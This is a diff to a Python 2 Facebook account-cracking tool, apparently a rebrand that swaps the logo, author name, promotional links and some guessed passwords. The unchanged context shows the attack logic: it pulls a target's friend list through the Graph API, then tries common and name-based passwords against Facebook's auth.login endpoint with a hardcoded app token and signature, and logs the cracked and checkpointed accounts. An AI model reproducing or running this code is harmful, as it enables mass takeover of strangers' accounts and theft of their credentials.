@@ -51,12 +51,12 @@ def jalan(z):
 #Dev:Rana
 ##### LOGO #####
 logo = """
-\033[1;96mM
-\033[1;96mR
-\033[1;96m-
-\033[1;96mA
-\033[1;96mF
-\033[1;96m2
+\033[1;96mAwlad|
+\033[1;96mtera
+\033[1;96m-bap
+\033[1;96m----
+\033[1;96mFuck Fb System
+\033[1;96mYah
 
 \033[1;92mH
 \033[1;92mE
@@ -66,8 +66,8 @@ logo = """
 \033[1;92m-
 
 \033[1;95m┈┈┈╱▔▔▔▔▔▔╲┈╭ ━ ━ ╮┈┈ Fuck Fb System.
-\033[1;95m┈┈▕┈╭━╮╭━╮┈▏┃ Awlad ┃┈┈
-\033[1;97m┈┈▕┈┃╭╯╰╮┃┈▏╰ ┳ ━ ╯┈┈
+\033[1;95m┈┈▕┈╭━╮╭━╮┈▏ ┃ Awlad ┃┈┈
+\033[1;97m┈┈▕┈┃╭╯╰╮┃┈▏ ╰ ┳ ━ ╯┈┈
 \033[1;97m┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈ 
 \033[1;97m┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈
 \033[1;95m┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈
@@ -75,19 +75,19 @@ logo = """
 
 \033[1;93m▇▇▇▇▇ Facebook\033[1;93m Awlad ▇▇▇▇▇
 \033[1;97m
-             ⊂ヽ
+              ⊂ヽ
              　 ＼＼   Λ＿Λ
               　　 ＼(  ˘ω˘  )
                 　　　 >　⌒ヽ
                  　　　/ 　 へ＼
                  　　 /　　/ 　＼＼
-                 　　 ﾚ　ノ　　  ヽ_つ
+                 　　 ﾚ　ノ　　   ヽ_つ
                  　　/　/
                  　 /　/|
                   　(　(ヽ
                   　|　|、＼
                   　| 丿 ＼ ⌒)
-                  　| |　　) /
+                  　| |　　 ) /
                    ノ )    Lﾉ
                   (_／     　　　
 \033[1;97m:•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;93mAwlad\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"""
@@ -109,12 +109,12 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;91mM
-\033[1;91mR
-\033[1;93m-
-\033[1;93mA
-\033[1;92mF
-\033[1;92m2
+\033[1;96mAwlad|
+\033[1;96mtera
+\033[1;96m-bap
+\033[1;96m----
+\033[1;96mFuck Fb System
+\033[1;96mYah
 
 \033[1;94mH
 \033[1;94mE
@@ -362,9 +362,9 @@ def crack():
 	os.system('clear')
 	print logo
 	print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mMr af2 Facebook Group Pakistan."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;95mMr af2 Group Cloning."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mMr af2 Youtube Chenal."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mMr  Facebook Group Pakistan."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;95mMr  Group Cloning."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mMr  Youtube Chenal."
 	print "\033[1;93m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
 
@@ -721,7 +721,7 @@ def pilih_hack():
 	        os.system('xdg-open https://mobile.facebook.com/groups/tolonews')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+	        os.system('xdg-open https://m.facebook.com/bap.eshan')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1311,7 +1311,7 @@ def pilih_Tiger():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;97m[•◄►•] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mMRAF2\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+		print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mAWlad\033\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1424,7 +1424,7 @@ def pilih_Tiger():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = ('password')											
+						           pass4 = ('qwertyuiop')											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -1512,7 +1512,7 @@ def pilih_Tiger():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = (b['first_name']+'*#')											
+										                           pass8 = (b['first_name']+'121')											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -1534,7 +1534,7 @@ def pilih_Tiger():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = ('iloveyou')					
+										                                       pass9 = ('iloveu')					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
@@ -1555,7 +1555,7 @@ def pilih_Tiger():
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)     	
-										                                         
+  
 																	
 															
 		except:
@@ -1605,7 +1605,7 @@ def test():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92mAwlad| Facebook Group."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92mAwlad| Facebook Best pas Group."
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_test()
 
